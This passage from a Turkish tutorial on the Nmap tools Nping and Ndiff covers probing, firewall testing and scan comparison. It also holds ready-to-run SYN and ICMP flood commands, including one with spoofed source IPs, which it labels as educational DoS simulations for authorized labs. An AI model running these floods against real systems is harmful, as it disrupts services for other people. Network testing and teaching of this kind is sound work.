    *   **ICMP (Internet Control Message Protocol):** Hata raporlama ve ağ teşhis mesajları için kullanılır. Nping, farklı ICMP türlerini ve kodlarını gönderebilir.
    *   **TCP (Transmission Control Protocol):** Bağlantı odaklı, güvenilir bir protokoldür. Nping, belirli TCP bayrakları (SYN, ACK, FIN, RST vb.) ayarlanmış paketler gönderebilir.
    *   **UDP (User Datagram Protocol):** Bağlantısız bir protokoldür. Nping, belirli UDP portlarına datagramlar gönderebilir.
    *   **ARP (Address Resolution Protocol):** Lokal ağlarda IP adreslerini MAC adreslerine çözümlemek için kullanılır. Nping, ARP istekleri ve yanıtları gönderebilir.
*   **Modlar:**
    *   **Normal Mod:** Paketleri gönderir ve yanıtları bekler/analiz eder.
    *   **Echo Modu (`--echo-server`, `--echo-client`):** Nping'in bir echo sunucusu veya istemcisi gibi davranmasını sağlar. Echo sunucusu, aldığı paketleri belirli kurallara göre değiştirerek geri gönderir. Bu, ağ yollarını ve paket manipülasyonlarını test etmek için kullanışlıdır.
*   **Paket Başlıkları:** Nping, IP başlığı (TTL, ToS, ID, Fragmentasyon), TCP başlığı (Kaynak/Hedef Port, Bayraklar, Sıra/Ack Numaraları, Pencere Boyutu), UDP başlığı (Kaynak/Hedef Port) ve ICMP başlığı (Tür, Kod) gibi birçok alanı özelleştirmenize olanak tanır.

### 5.2 Temel Nping Komutları

Varsayılan olarak Nping, root/administrator yetkisi olmadan TCP modunda çalışır. Diğer modlar (ICMP, UDP raw socket) genellikle root yetkisi gerektirir.

#### Ping Türleri

*   **ICMP Echo Ping (Root/Admin Gerekir):**
    Geleneksel ping'e en yakın olanıdır.
    ```bash
    sudo nping --icmp <hedef_ip_veya_hostname>
    ```
    Örnek Çıktı:
    ```
    Starting Nping 0.7.94 ( https://nmap.org/nping ) at 2023-10-27 11:00 UTC
    SENT (0.0052s) ICMP [192.168.1.10 > 8.8.8.8 Echo request (type=8/code=0) id=123 seq=1] IP [ttl=64 id=54321 iplen=28]
    RCVD (0.0252s) ICMP [8.8.8.8 > 192.168.1.10 Echo reply (type=0/code=0) id=123 seq=1] IP [ttl=118 id=0 iplen=28] (20.00ms)
    ...
    Max rtt: 20.00ms | Min rtt: 19.50ms | Avg rtt: 19.75ms
    Raw packets sent: 5 (140B) | Rcvd: 5 (140B) | Lost: 0 (0.00%)
    Nping done: 1 IP address pinged in 4.05 seconds
    ```

*   **TCP Ping (Varsayılan Mod, Root/Admin Gerekmez):**
    Belirtilen bir TCP portuna (varsayılan 80) SYN paketi gönderir ve yanıt bekler. Hedef port açıksa SYN/ACK, kapalıysa RST döner.
    ```bash
    nping --tcp -p <port> <hedef_ip_veya_hostname>
    ```
    Örnek: Bir web sunucusunun 80. portuna TCP SYN ping:
    ```bash
    nping --tcp -p 80 scanme.nmap.org
    ```
    Çıktı, gönderilen TCP SYN ve alınan TCP SYN/ACK (veya RST) paketlerini gösterir.

*   **UDP Ping (Root/Admin Gerekir):**
    Belirtilen bir UDP portuna (varsayılan 53) boş bir UDP datagramı gönderir.
    ```bash
    sudo nping --udp -p <port> <hedef_ip_veya_hostname>
    ```
    Örnek: Bir DNS sunucusunun 53. portuna UDP ping:
    ```bash
    sudo nping --udp -p 53 8.8.8.8
    ```
    UDP bağlantısız olduğu için, yanıt olarak ICMP Port Unreachable (port kapalıysa) veya hiçbir yanıt (port açık veya filtrelenmişse) alınabilir.

*   **ARP Ping (Sadece Lokal Ağda, Root/Admin Gerekir):**
    Hedef IP adresine bir ARP isteği gönderir. Hedef canlıysa ve aynı lokal ağdaysa, MAC adresini içeren bir ARP yanıtı döner.
    ```bash
    sudo nping --arp <hedef_lokal_ip>
    ```
    Örnek:
    ```bash
    sudo nping --arp 192.168.1.1
    ```

#### Paket Sayısı ve Hızı

*   **Paket Sayısı (`-c <sayı>` veya `--count <sayı>`):**
    Gönderilecek toplam paket sayısını belirler. Varsayılan 5'tir. `0` belirtilirse sürekli gönderir (Ctrl+C ile durdurulur).
    ```bash
    nping --icmp -c 10 google.com
    ```

*   **Gönderim Hızı (`--rate <saniyede_paket>`):**
    Saniyede gönderilecek paket sayısını ayarlar.
    ```bash
    nping --tcp -p 80 --rate 10 scanme.nmap.org # Saniyede 10 TCP SYN paketi
    ```

*   **Paketler Arası Gecikme (`--delay <süre>`):**
    Gönderilen her paket arasında beklenecek süreyi ayarlar (örn: `500ms`, `1s`, `2m`).
    ```bash
    nping --icmp --delay 1s google.com # Her saniye bir ICMP paketi
    ```

#### Temel Özelleştirmeler

*   **Hedef Port (`-p <port>` veya `--dest-port <port>`):**
    TCP veya UDP modunda hedef portu belirler.
    ```bash
    nping --tcp -p 443 scanme.nmap.org
    ```

*   **Kaynak Port (`--source-port <port>` veya `-g <port>`):**
    Gönderilen paketler için kaynak portu belirler.
    ```bash
    nping --tcp -p 80 --source-port 12345 scanme.nmap.org
    ```

*   **TCP Bayrakları (`--flags <bayrak_listesi>`):**
    TCP modunda, gönderilecek paketteki TCP bayraklarını (flag) ayarlar. Bayraklar virgülle veya boşlukla ayrılabilir: `S` (SYN), `A` (ACK), `F` (FIN), `R` (RST), `P` (PSH), `U` (URG), `ECE`, `CWR`.
    ```bash
    nping --tcp -p 80 --flags SA scanme.nmap.org  # SYN ve ACK bayrakları setli
    nping --tcp -p 80 --flags R scanme.nmap.org   # Sadece RST bayrağı setli
    ```

*   **TTL (Time To Live) Değeri (`--ttl <değer>`):**
    Gönderilen IP paketlerinin TTL değerini ayarlar. 0 ile 255 arasında bir değer alır.
    ```bash
    nping --icmp --ttl 5 google.com
    ```

### 5.3 Orta Seviye Nping Uygulamaları

#### TTL Değiştirerek Ağ Yolu Analizi (Traceroute Benzeri)

Nping, artan TTL değerleriyle paketler göndererek bir hedefe giden ağ yolundaki yönlendiricileri (hop) tespit etmek için kullanılabilir (traceroute aracının yaptığı gibi).

```bash
# Her TTL değeri için 3 paket gönder, TCP modunda 80. porta
for i in $(seq 1 30); do sudo nping --tcp -p 80 --ttl $i -c 1 <hedef_ip_veya_hostname>; done
```
Bu komut, TTL değeri 1'den başlayarak 30'a kadar her TTL için hedefe bir TCP paketi gönderir. TTL süresi dolduğunda, ilgili yönlendirici bir ICMP Time Exceeded mesajı gönderecektir. Bu mesajların kaynak IP'leri, ağ yolundaki hop'ları gösterir.

#### Kaynak/Hedef Port ve IP Adresi Özelleştirme

*   **Kaynak IP Adresi (`-S <kaynak_ip>` veya `--source-ip <kaynak_ip>`):**
    Gönderilen paketler için sahte bir kaynak IP adresi belirler. **UYARI: Bu, IP sahteciliğidir (IP spoofing) ve genellikle ağlar tarafından engellenir veya sorunlara yol açabilir. Sadece çok özel test senaryolarında ve izinle kullanılmalıdır.**
    ```bash
    sudo nping --tcp -p 80 -S 1.2.3.4 <hedef_ip> # 1.2.3.4 sahte kaynak IP'si
    ```

#### Flood Modu ile Performans Testi (DİKKAT!)

Nping, bir hedefe çok yüksek hızda paketler göndererek (flooding) ağın veya hedef servisin performansını test etmek için kullanılabilir. **BU TEKNİK, HİZMET REDDİ (DoS) SALDIRISI OLARAK ALGILANABİLİR VE HEDEF SİSTEMİ AKSATABİLİR. KESİNLİKLE YASAL İZİN ALMADAN VE KONTROLLÜ BİR ORTAM DIŞINDA KULLANMAYIN!**

```bash
# Saniyede 1000 TCP SYN paketi, 80. porta, sürekli gönder (Ctrl+C ile durdur)
sudo nping --tcp -p 80 --rate 1000 -c 0 <hedef_ip>

# Saniyede olabildiğince hızlı ICMP paketi gönder (çok tehlikeli!)
sudo nping --icmp --rate 0 -c 0 <hedef_ip>
```
*   `--rate 0`: Mümkün olan en yüksek hızda gönderir.
*   `-c 0`: Sürekli gönderir.

**Tekrar UYARI:** Flood modu, ağ ekipmanlarını ve sunucuları aşırı yükleyebilir. Sadece kendi kontrolünüzdeki sistemlerde veya yazılı izinle test amaçlı kullanın.

#### Farklı TCP Bayrak Kombinasyonları ile Tarama/Test

Güvenlik duvarlarının veya IDS'lerin belirli TCP bayrak kombinasyonlarına nasıl tepki verdiğini test etmek için Nping kullanılabilir.
Örnek: "FIN Scan" benzeri bir test:
```bash
sudo nping --tcp -p 1-1024 --flags F <hedef_ip>
```
Bu, 1-1024 arasındaki portlara sadece FIN bayrağı setli TCP paketleri gönderir.

### 5.4 İleri Seviye Nping Uygulamaları

#### Packet Crafting (Paket İçeriğini Özelleştirme)

Nping, paketlerin çeşitli başlık alanlarını ve payload (veri yükü) kısımlarını detaylı bir şekilde özelleştirmenize olanak tanır.

*   **Veri Ekleme (Payload):**
    *   `--data <hex_string>`: Pakete hexadecimal (onaltılık) formatta veri ekler.
        ```bash
        sudo nping --udp -p 1234 --data "AABBCCDDEEFF0011" <hedef_ip>
        ```
    *   `--data-string <string>`: Pakete metin (string) olarak veri ekler.
        ```bash
        sudo nping --tcp -p 80 --data-string "GET / HTTP/1.0\r\n\r\n" <hedef_ip>
        ```
    *   `--data-length <uzunluk>`: Belirtilen uzunlukta rastgele baytlardan oluşan bir payload ekler.

*   **IP Seçenekleri (`--ip-options <hex_string_veya_options>`):**
    IP başlığına özel seçenekler ekler (örn: Loose Source Routing, Strict Source Routing, Record Route). Bu, genellikle eski bir özelliktir ve modern ağlarda pek desteklenmez veya güvenlik nedeniyle engellenir.
    Örnek (Record Route): `R` (bu seçenek Nping içinde doğrudan desteklenmeyebilir, hex olarak verilmesi gerekebilir)

*   **TCP Seçenekleri (`--tcp-options <hex_string_veya_options>`):**
    TCP başlığına özel seçenekler ekler (örn: MSS, Window Scale, Timestamps, SACK).

*   **Diğer IP Başlığı Alanları:**
    *   `--id <değer>`: IP Identification alanını ayarlar.
    *   `--tos <değer>`: Type of Service alanını ayarlar.
    *   `--df`: Don't Fragment bayrağını ayarlar.
    *   `--mf`: More Fragments bayrağını ayarlar.
    *   `--frag-off <offset>`: Fragment offset değerini ayarlar.

*   **Diğer TCP Başlığı Alanları:**
    *   `--seq <numara>`: TCP Sequence Number'ı ayarlar.
    *   `--ack <numara>`: TCP Acknowledgment Number'ı ayarlar.
    *   `--win <boyut>`: TCP Window Size'ı ayarlar.
    *   `--urgptr <değer>`: TCP Urgent Pointer'ı ayarlar.

**Örnek: Özelleştirilmiş bir TCP SYN Paketi**
```bash
sudo nping --tcp -p 80 \
           --flags S \
           --ttl 128 \
           --win 65535 \
           --seq 12345 \
           --source-port 54321 \
           --data-string "TestPayload" \
           <hedef_ip>
```

#### DoS Simülasyonları (Eğitim Amaçlı ve Yasal İzinle!)

Nping'in flood modu ve paket özelleştirme yetenekleri, çeşitli DoS (Denial of Service - Hizmet Reddi) saldırılarını simüle etmek için kullanılabilir. **BU TEKNİKLERİN KULLANIMI SON DERECE RİSKLİDİR VE SADECE YASAL İZİNLE, KONTROLLÜ LABORATUVAR ORTAMLARINDA VE EĞİTİM AMAÇLI YAPILMALIDIR.**

*   **SYN Flood Simülasyonu:** Hedefe çok sayıda TCP SYN paketi göndererek yarı açık bağlantılar oluşturmaya çalışır.
    ```bash
    sudo nping --tcp -p <hedef_port> --flags S --rate 10000 -c 0 --source-ip <sahte_kaynak_ip_aralığı_veya_RND> <hedef_ip>
    ```
    `--source-ip RND` veya bir IP aralığı kullanmak, saldırının kaynağını gizlemeye (veya daha doğrusu dağıtmaya) çalışır.

*   **ICMP Flood (Ping of Death benzeri değil, sadece hacimsel):**
    ```bash
    sudo nping --icmp --rate 0 -c 0 <hedef_ip>
    ```

**UYARI:** Bu tür simülasyonlar bile hedef sistemleri veya ağları olumsuz etkileyebilir. Her zaman sorumlu davranın.

#### Gerçekçi Ağ Trafiği Üretimi

Belirli bir protokol veya uygulama davranışını taklit eden özel trafik profilleri oluşturmak için Nping kullanılabilir. Bu, ağ cihazlarının veya güvenlik sistemlerinin belirli trafik türlerine nasıl tepki verdiğini test etmek için faydalı olabilir. Bu genellikle Nping'i bir script içinde döngülerle ve farklı parametrelerle kullanmayı gerektirir.

#### Echo İstemci/Sunucu Modu

Nping'in echo modu, ağ yolundaki paket manipülasyonlarını, güvenlik duvarı davranışlarını ve NAT cihazlarını test etmek için güçlü bir araçtır.

*   **Echo Sunucusu Başlatma:**
    Echo sunucusu, gelen paketleri alır, isteğe bağlı olarak değiştirir ve geri gönderir.
    ```bash
    sudo nping --echo-server "secretpassword" --udp -p 7777 --interface eth0
    ```
    *   `"secretpassword"`: Echo istemcisinin sunucuya bağlanmak için kullanacağı şifre.
    *   `--udp -p 7777`: Echo sunucusunun UDP 7777 portunda dinlemesini sağlar.
    *   `--interface eth0`: Hangi ağ arayüzünde dinleyeceğini belirtir.

*   **Echo İstemcisi ile Paket Gönderme:**
    Echo istemcisi, echo sunucusuna paketler gönderir ve sunucudan yansıyan paketleri alır.
    ```bash
    sudo nping --echo-client "secretpassword" <echo_sunucu_ip> --tcp -p 80 --dest-ip <nihai_hedef_ip> --ttl 10
    ```
    *   `--echo-client "secretpassword"`: Echo sunucusuna bağlanmak için şifre.
    *   `<echo_sunucu_ip>`: Echo sunucusunun IP adresi.
    *   `--tcp -p 80 --dest-ip <nihai_hedef_ip>`: Bu, echo sunucusunun yansıtacağı paketin özellikleridir (nihai hedefin 80. portuna TCP paketi).
    *   `--ttl 10`: İstemciden echo sunucusuna gönderilen "taşıyıcı" paketin TTL'si.

    Bu senaryoda, istemci echo sunucusuna bir UDP paketi gönderir. Bu UDP paketinin payload'ı, `--dest-ip` ve diğer parametrelerle tanımlanan asıl paketi (örn: TCP SYN) içerir. Echo sunucusu bu payload'ı alır, kaynak ve hedef IP/portlarını değiştirerek (istemciyi kaynak, `--dest-ip`'yi hedef yaparak) asıl paketi gönderir.

### 5.5 Nping Örnek Senaryoları

#### Senaryo 1: Bir Host'un Farklı Protokoller ve Portlar Üzerinden Yanıt Verip Vermediğini Detaylı Test Etmek

**Amaç:** Belirli bir hostun ICMP, TCP (belirli portlarda) ve UDP (belirli portlarda) üzerinden erişilebilir olup olmadığını kontrol etmek.
**Komutlar:**
```bash
# ICMP Testi
sudo nping --icmp -c 3 <hedef_ip>

# TCP Port 80 (HTTP) ve 443 (HTTPS) Testi
nping --tcp -p 80,443 -c 3 <hedef_ip>

# UDP Port 53 (DNS) Testi
sudo nping --udp -p 53 -c 3 <hedef_ip>
```
**Analiz:** Her komutun çıktısını inceleyin. "RCVD" satırları, hedeften yanıt alındığını gösterir. TCP için SYN/ACK (açık) veya RST (kapalı) yanıtlarına, UDP için ise ICMP Port Unreachable (kapalı) veya zaman aşımına dikkat edin.

#### Senaryo 2: Bir Firewall'un Belirli Türde Paketleri Engelleyip Engellemediğini Test Etmek

**Amaç:** Bir güvenlik duvarının, örneğin, dışarıdan gelen ve belirli bir porta yönelik TCP SYN paketlerini veya belirli ICMP türlerini engelleyip engellemediğini test etmek.
**Senaryo:** Firewall'un arkasındaki bir makineye (`internal_host_ip`) TCP port 22 (SSH) erişimini test etmek istiyoruz. Firewall'un önündeki bir makineden (`external_tester_ip`) Nping kullanacağız.

1.  **Test 1 (Firewall Kuralı Yoksa Beklenen Davranış):**
    Eğer `internal_host_ip`'de SSH çalışıyorsa ve firewall engellemiyorsa:
    ```bash
    # external_tester_ip'den çalıştır
    nping --tcp -p 22 -c 1 <internal_host_ip>
    ```
    Beklenen: `RCVD ... Flags: SA ...` (SYN/ACK yanıtı)

2.  **Test 2 (Firewall Kuralı Varsa Beklenen Davranış):**
    Eğer firewall TCP port 22'yi engelliyorsa:
    ```bash
    # external_tester_ip'den çalıştır
    nping --tcp -p 22 -c 1 <internal_host_ip>
    ```
    Beklenen: Hiçbir "RCVD" satırı (paket düşürülüyor) veya firewall'dan bir RST/ICMP administratively prohibited (paket reddediliyor).

**ICMP Engelleme Testi:**
Firewall'un ICMP Echo Request'leri (ping) engelleyip engellemediğini test etmek:
```bash
# external_tester_ip'den çalıştır
sudo nping --icmp --icmp-type 8 -c 1 <internal_host_ip>
```
Beklenen: Eğer engelleniyorsa "Lost" paketler, engellenmiyorsa "RCVD ... Echo reply ..."

**Analiz:** Nping'in çıktıları, firewall'un paketleri düşürüp düşürmediğini (yanıt yok), reddedip reddetmediğini (RST veya ICMP hata mesajı) veya izin verip vermediğini (başarılı yanıt) anlamanıza yardımcı olur.

#### Senaryo 3: Ağdaki Gecikme (Latency) ve Jitter Değerlerini Ölçmek

**Amaç:** Bir hedefe olan ağ gecikmesini (RTT - Round Trip Time) ve bu gecikmedeki değişkenliği (jitter) ölçmek.
**Komut:**
```bash
# ICMP ile 100 paket göndererek RTT istatistiklerini al
sudo nping --icmp -c 100 <hedef_ip>
```
**Çıktıdan İlgili Kısımlar:**
```
...
Max rtt: 25.50ms | Min rtt: 18.90ms | Avg rtt: 20.15ms
...
```
*   **Avg rtt:** Ortalama gidiş-dönüş süresi (gecikme).
*   **Min rtt ve Max rtt arasındaki fark:** Jitter hakkında bir fikir verir. Daha kararlı bir bağlantıda bu fark daha az olacaktır.
    Nping doğrudan jitter hesaplamaz, ancak bu değerlerden veya RTT değerlerinin standart sapmasından (eğer Nping detaylı RTT'leri veriyorsa) çıkarım yapılabilir.

#### Senaryo 4: (Etik Hacking Kapsamında) Mikrofon/Kamera Erişimi Testi için Kullanılabilecek Potansiyel Portlara Özel Paket Gönderimi

**Amaç:** Bir sistemde (izinle) uzaktan erişim truva atları (RAT) veya IoT cihazları tarafından kullanılabilecek bilinen veya şüpheli portlara özel olarak hazırlanmış TCP/UDP paketleri göndererek potansiyel bir aktiviteyi tetiklemeye veya tespit etmeye çalışmak. Bu, çok spekülatif bir senaryodur ve genellikle daha kapsamlı analizlerle desteklenmelidir.
**ÖRNEK (Tamamen Varsayımsal):**
Diyelim ki bir RAT'ın TCP port 7777'de dinlediğinden ve "CONNECT_ME" string'ini içeren bir paket aldığında yanıt verdiğinden şüpheleniyoruz.
```bash
# Hedefin 7777 TCP portuna "CONNECT_ME" içeren bir paket gönder
sudo nping --tcp -p 7777 --data-string "CONNECT_ME" -c 1 <hedef_ip>
```
**Analiz:** Eğer hedeften beklenmedik bir yanıt (normal bir RST veya timeout dışında) alınırsa, bu daha fazla araştırma için bir işaret olabilir. Bu tür testler genellikle Wireshark gibi araçlarla birlikte hedefin ağ trafiğini izleyerek yapılır. **Bu senaryo, hedef sistemin davranışını ve potansiyel zararlı yazılımların iletişim protokollerini bilmeyi gerektirir ve genellikle çok zordur.**

#### Senaryo 5: Bir Ağ Cihazının (Router, Switch) Özel ARP İsteklerine Nasıl Yanıt Verdiğini Gözlemlemek

**Amaç:** Lokal ağdaki bir yönlendiricinin veya anahtarın, standart dışı veya hatalı oluşturulmuş ARP isteklerine nasıl tepki verdiğini görmek. Bu, bazı ARP spoofing tekniklerinin veya ağ keşif yöntemlerinin etkinliğini anlamak için yapılabilir (tamamen lokal ağda ve izinle).
**Nping, ARP paket başlıklarını doğrudan ve detaylı bir şekilde manipüle etme seçeneği sunmayabilir (`--arp` modu daha çok standart istekler içindir).** Bu tür çok özel ARP paketleri oluşturmak için Scapy (Python kütüphanesi) gibi daha esnek paket oluşturma araçları daha uygun olabilir.

Ancak, Nping ile bir hedefin ARP tablosunda olup olmadığını veya belirli bir IP'ye ARP isteği gönderildiğinde yanıt alınıp alınmadığını test edebilirsiniz:
```bash
# 192.168.1.1'in ARP tablosunda olup olmadığını kontrol et (veya canlı olup olmadığını)
sudo nping --arp -c 3 192.168.1.1 --interface eth0
```
*   `--interface eth0`: Hangi ağ arayüzünden ARP paketlerinin gönderileceğini belirtir.

---

## 6. Ndiff - Tarama Sonuçlarını Karşılaştırma Aracı

Ndiff (Nmap Diff), iki farklı Nmap XML tarama çıktısını karşılaştırarak aralarındaki farkları (örneğin, yeni açılan veya kapanan portlar, değişen servis versiyonları, eklenen veya çıkarılan hostlar) tespit eden bir komut satırı aracıdır. Ağınızdaki değişiklikleri izlemek, güvenlik denetimlerinin sonuçlarını takip etmek ve yapılandırma değişikliklerinin etkisini doğrulamak için çok kullanışlıdır.

### 6.1 Ndiff Temel Kavramları

*   **Neden Tarama Sonuçlarını Karşılaştırmalıyız?**
    *   **Değişiklik Tespiti:** Ağdaki veya sistemlerdeki planlı ya da plansız değişiklikleri (yeni servisler, kapanan portlar, OS değişiklikleri) belirlemek.
    *   **Güvenlik Duruşunun İzlenmesi:** Zaman içinde güvenlik açıklarının veya yanlış yapılandırmaların ortaya çıkıp çıkmadığını takip etmek.
    *   **Yapılandırma Doğrulaması:** Bir güvenlik duvarı kuralı veya sistem yaması uygulandıktan sonra beklenen değişikliğin (örn: portun kapanması) gerçekleşip gerçekleşmediğini teyit etmek.
    *   **Olay Müdahalesi:** Bir güvenlik olayı sonrasında, olayın ağ üzerindeki etkilerini (yeni açılan portlar, şüpheli servisler) anlamak için olay öncesi ve sonrası taramaları karşılaştırmak.
*   **Ndiff'in Çalışma Mantığı:** Ndiff, Nmap tarafından `-oX` seçeneğiyle üretilen XML formatındaki çıktı dosyalarını girdi olarak alır. Bu iki XML dosyasını ayrıştırır ve hostlar, portlar, servisler, işletim sistemleri gibi çeşitli özellikleri karşılaştırarak farklılıkları raporlar.

### 6.2 Temel Ndiff Komutları

Ndiff'in kullanımı oldukça basittir. Genellikle iki Nmap XML dosyası argüman olarak verilir.

*   **İki Nmap XML Çıktısını Karşılaştırmak:**
    ```bash
    ndiff <scan1.xml> <scan2.xml>
    ```
    Örnek: `dun.xml` (dünkü tarama) ve `bugun.xml` (bugünkü tarama) dosyalarını karşılaştırmak:
    ```bash
    ndiff dun.xml bugun.xml
    ```
    **Çıktı Formatı:**
    Ndiff, farklılıkları okunabilir bir metin formatında standart çıktıya yazar. Çıktı genellikle şu şekilde başlar:
    ```
    -Nmap 7.92 scan initiated Mon Oct 26 10:00:00 2023 as: nmap -oX dun.xml ...
    +Nmap 7.94 scan initiated Tue Oct 27 10:00:00 2023 as: nmap -oX bugun.xml ...
    ```
    *   `-` ile başlayan satırlar ilk dosyada (eskide) olan ama ikinci dosyada (yenide) olmayan veya değişen şeyleri gösterir.
    *   `+` ile başlayan satırlar ikinci dosyada (yenide) olan ama ilk dosyada (eskide) olmayan veya değişen şeyleri gösterir.
    *   Değişmeyen kısımlar genellikle gösterilmez (aşağıdaki `-v` seçeneğine bakın).

    **Örnek Ndiff Çıktısından Bir Kesit:**
    ```
    Host 192.168.1.10 (example-host.lan):
    Ports:
    -22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
    +22/tcp   open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.1  <-- SSH versiyonu değişmiş
    +8080/tcp open     http-proxy                                 <-- Yeni bir port açılmış
    -443/tcp  open     ssl/http   Apache httpd 2.4.41 ((Ubuntu))
                                                                  <-- 443 portu kapanmış veya artık taramada yok
    OS:
    -Linux 5.4
    +Linux 5.15                                                   <-- İşletim sistemi (kernel) değişmiş
    ```

*   **Ayrıntılı Çıktı (`-v` veya `--verbose`):**
    Sadece farklılıkları değil, aynı kalan kısımları da gösterir. Bu, iki tarama arasındaki tam bir karşılaştırma yapmak için faydalı olabilir ancak çıktı çok uzun olabilir.
    ```bash
    ndiff -v dun.xml bugun.xml
    ```

*   **XML Formatında Çıktı (`--xml`):**
    Farklılıkları metin yerine XML formatında çıktı olarak verir. Bu, Ndiff sonuçlarını başka scriptler veya araçlarla programatik olarak işlemek için kullanışlıdır.
    ```bash
    ndiff --xml dun.xml bugun.xml > farklar_raporu.xml
    ```

### 6.3 Orta ve İleri Seviye Ndiff Uygulamaları

*   **Otomasyon ile Fark Raporlaması (Scripting):**
    Ndiff, periyodik taramalar yapan ve değişiklikleri otomatik olarak raporlayan scriptlerde kolayca kullanılabilir. Bir önceki bölümde (Senaryo 3.10.4) bunun bir örneği verilmişti.
    Temel mantık:
    1.  Nmap ile periyodik tarama yap ve sonucu XML olarak kaydet (örn: `scan_YYYY-MM-DD.xml`).
    2.  Mevcut tarama sonucunu bir önceki tarama sonucuyla Ndiff kullanarak karşılaştır.
    3.  Ndiff çıktısını bir dosyaya yaz veya doğrudan işle.
    4.  Eğer Ndiff çıktısı boş değilse (yani fark varsa), bir bildirim gönder (e-posta, Slack mesajı vb.).

    **Basit Bash Script Örneği (sadece fark varsa çıktı verir):**
    ```bash
    #!/binbash

    PREVIOUS_SCAN="path/to/previous_scan.xml"
    CURRENT_SCAN="path/to/current_scan.xml"
    DIFF_OUTPUT=$(ndiff $PREVIOUS_SCAN $CURRENT_SCAN)

    if [ -n "$DIFF_OUTPUT" ]; then
      echo "Ağda değişiklikler tespit edildi:"
      echo "$DIFF_OUTPUT"
      # Burada e-posta gönderme veya başka bir bildirim mekanizması eklenebilir
    else
      echo "Ağda herhangi bir değişiklik tespit edilmedi."
    fi
    ```

*   **CI/CD Pipeline Entegrasyonu (Kavramsal):**
    DevOps ortamlarında, bir uygulama veya altyapı değişikliği (deployment) yapıldıktan sonra, Nmap taramaları ve Ndiff karşılaştırmaları otomatik olarak CI/CD pipeline'ına entegre edilebilir.
    *   **Deployment Öncesi Tarama:** Mevcut durumun bir anlık görüntüsünü alın.
    *   **Deployment:** Değişikliği uygulayın.
    *   **Deployment Sonrası Tarama:** Yeni durumu tarayın.
    *   **Ndiff ile Karşılaştırma:** İki tarama sonucunu karşılaştırın.
    *   **Analiz:** Beklenmedik port açılımları, kapanan gerekli portlar veya servis değişiklikleri varsa pipeline'ı durdurun veya uyarı oluşturun.

*   **Günlük/Haftalık Raporlama Sistemleri:**
    Senaryo 3.10.4'teki script, bu amaca hizmet eden bir örnektir. Daha gelişmiş sistemler, Ndiff XML çıktılarını ayrıştırıp, değişiklikleri bir veritabanında saklayabilir ve web arayüzü üzerinden trend analizleri veya detaylı raporlar sunabilir.

*   **Büyük Veri Analizi için Ndiff Çıktısını İşleme (Kavramsal):**
    Çok sayıda sistemin düzenli olarak tarandığı büyük ortamlarda, Ndiff XML çıktıları bir log yönetimi veya SIEM (Security Information and Event Management) sistemine aktarılabilir. Bu sistemlerde, zaman içindeki değişiklikler analiz edilebilir, anormal davranışlar tespit edilebilir ve güvenlik olaylarına dair korelasyonlar kurulabilir.

### 6.4 Ndiff Örnek Senaryoları

#### Senaryo 1: Haftalık Ağ Taraması Sonuçlarını Karşılaştırarak Yeni Açılan/Kapanan Portları Tespit Etmek

**Amaç:** Bir kuruluşun dışa açık (internet facing) sistemlerinin haftalık Nmap taramalarını karşılaştırarak, bir önceki haftaya göre hangi portların yeni açıldığını veya kapandığını belirlemek.
**Adımlar:**
1.  **Hafta 1 Tarama:**
    ```bash
    sudo nmap -sS -sV -T4 -p- --reason -oX hafta1_scan.xml <hedef_ip_aralığı_veya_domainler>
    ```
2.  **Hafta 2 Tarama (Bir hafta sonra):**
    ```bash
    sudo nmap -sS -sV -T4 -p- --reason -oX hafta2_scan.xml <hedef_ip_aralığı_veya_domainler>
    ```
3.  **Ndiff ile Karşılaştırma:**
    ```bash
    ndiff hafta1_scan.xml hafta2_scan.xml > haftalik_fark_raporu.txt
    ```
**Analiz:** `haftalik_fark_raporu.txt` dosyasını inceleyin.
*   `+` ile başlayan port satırları, bu hafta yeni açılmış veya durumu değişmiş (örn: `filtered`'dan `open`'a) portları gösterir.
*   `-` ile başlayan port satırları, geçen hafta açık olan ama bu hafta kapanmış veya durumu değişmiş portları gösterir.
Bu değişikliklerin planlı olup olmadığını (yeni bir servis devreye alındı mı, bir güvenlik duvarı kuralı değişti mi vb.) araştırın. Beklenmedik açık portlar bir güvenlik riski oluşturabilir.

#### Senaryo 2: Bir Web Sunucusunda Yapılan Yapılandırma Değişikliklerini İzlemek

**Amaç:** Bir web sunucusuna yapılan bir güncelleme veya yapılandırma değişikliği sonrasında, port durumlarının, servis versiyonlarının veya HTTP başlıklarının (NSE scripti ile elde edilen) değişip değişmediğini kontrol etmek.
**Adımlar:**
1.  **Değişiklik Öncesi Tarama (`nginx_v1.xml`):**
    ```bash
    sudo nmap -sV --script=http-headers,banner -p 80,443 -oX nginx_v1.xml webserver.example.com
    ```
2.  **Değişiklik Yapın:** Web sunucusunu güncelleyin (örn: Nginx versiyon yükseltme) veya bir yapılandırma değiştirin.
3.  **Değişiklik Sonrası Tarama (`nginx_v2.xml`):**
    ```bash
    sudo nmap -sV --script=http-headers,banner -p 80,443 -oX nginx_v2.xml webserver.example.com
    ```
4.  **Ndiff ile Karşılaştırma:**
    ```bash
    ndiff nginx_v1.xml nginx_v2.xml
    ```
**Analiz:** Ndiff çıktısında, Nginx servis versiyonunun değişip değişmediğini, `http-headers` scriptinin döndürdüğü `Server` başlığının veya diğer başlıkların güncellenip güncellenmediğini kontrol edin. Beklenen değişiklikler mi, yoksa beklenmedik yan etkiler mi var?

#### Senaryo 3: Bir Güvenlik Duvarı Kural Değişikliğinin Etkisini Nmap Taramaları ve Ndiff ile Doğrulamak

**Amaç:** Bir güvenlik duvarında belirli bir porta erişimi engellemek için bir kural eklendiğinde, bu kuralın gerçekten işe yarayıp yaramadığını Nmap ve Ndiff ile doğrulamak.
**Adımlar:**
1.  **Kural Öncesi Tarama (`firewall_oncesi.xml`):** Firewall kuralı uygulanmadan önce, engellenmesi planlanan porta Nmap ile tarama yapın.
    ```bash
    sudo nmap -sS -p <engellenecek_port> -oX firewall_oncesi.xml <hedef_ip_arkasindaki_sunucu>
    ```
    Bu taramada portun `open` olması beklenir.
2.  **Firewall Kuralını Uygulayın:** Güvenlik duvarında ilgili porta erişimi engelleyen kuralı aktif edin.
3.  **Kural Sonrası Tarama (`firewall_sonrasi.xml`):** Aynı Nmap komutunu tekrar çalıştırın.
    ```bash
    sudo nmap -sS -p <engellenecek_port> -oX firewall_sonrasi.xml <hedef_ip_arkasindaki_sunucu>
    ```
    Bu taramada portun `filtered` veya `closed` (eğer firewall RST ile yanıt veriyorsa) olması beklenir.
4.  **Ndiff ile Karşılaştırma:**
    ```bash
